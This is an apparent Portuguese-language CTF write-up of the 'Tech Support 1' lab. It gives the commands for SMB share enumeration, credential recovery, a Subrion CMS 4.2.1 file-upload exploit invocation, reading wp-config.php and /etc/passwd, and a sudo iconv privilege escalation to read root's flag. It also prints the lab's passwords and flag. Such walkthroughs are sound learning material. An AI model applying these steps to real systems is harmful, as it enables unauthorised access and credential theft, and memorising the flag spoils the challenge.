TECH SUPPORT 1 CTF

Ao gerar o ip dei o comando nmap para verificar as portas abertas

    nmap -A -sV -Pn IP

Encontrando as portas:

    22 80 139 445

rodando um smbclient que e um programa similar ao ftp, usado para
transferencias de arquivos, ao tentar entrar ele pede uma senha ao nao inserir nada ele me retorna um help que usando alguns parametros eu podia visualizar algumas coisas 
usando o parametro -L 

    smbclient -L IP

Ele me retornava

     Sharename       Type      Comment
     ---------       ----      -------
     print$          Disk      Printer Drivers
     websvr          Disk
     IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))

Procurando pelo diretorio..

    smbclient //IP/websvr

Nao era possivel ler mas era possivel baixa-lo, entao..


    GOALS
    =====
    1)Make fake popup and host it online on Digital Ocean server
    2)Fix subrion site, /subrion doesn't work, edit from panel
    3)Edit wordpress website

Assim me retornando 

    IMP
    ===
    Subrion creds
    |->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
    Wordpress creds
    |->

Usuario e senha: 

    username admin
    pass 7sKvntXdPEJaxazce9PXi24zaFrLiKWCk

Aparentemente o servidor poderia ter um wordpress que procurei usando a ferramenta Gobuster

Encontrando o diretorio nao era possivel realizar nada de util..
Assim fui atras do site que informava no enter.txt

    IP/subrion/panel

para entrar tinha que descriptografar a senha..

usando o CyberChef.. 

    https://gchq.github.io/CyberChef/

E introduzindo o HASH ele voltava com a senha..

    Scam2021

Assim..

    Username: admin
    Pass: Scam2021

Acessando o dashboard tinha a versao do subrion CMS

    Subrion CMS v4.2.1

Procurando exploits, encontrei 4 exploits para essa versao...

Usando a falha:

    Arbitrary File Upload

    python3 49876 -u http://IP/subrion/panel/ -l admin -p Scam2021

Podiamos dar ls e cat em qualquer diretorio, mas nao navegar por ele, entao indo atras do wordpress do servidor

Encontrei na pasta wordpress a config dele
    
    cat /var/www/html/wordpress/wp-config.php

Acessando a senha e um user support da database

    pass ImAScammerLOL!123!

ao entrar entrar com o user support nao deu certo... entao fui buscar
um outro usuario, dentro da pasta /etc/passwd tinha um outro user executando arquivos
scamsite

    user scamsite
    pass ImAScammerLOL!123!

Ao acessar eu ja sabia que a flag estava na pasta root, entao ja tenho que escalar os privilegios

    sudo -l
    (ALL) NOPASSWD: /usr/bin/iconv

Ao procurar um script para executar como root no gtfobins..

    sudo /usr/bin/iconv iconv-f 8859_1 -t 8859_1 "/root/root.txt"

Ao executar...

    FLAG: 851b8233a8c09400ec30651bd1529bf1ed02790b -


DESAFIO CONCLUIDO!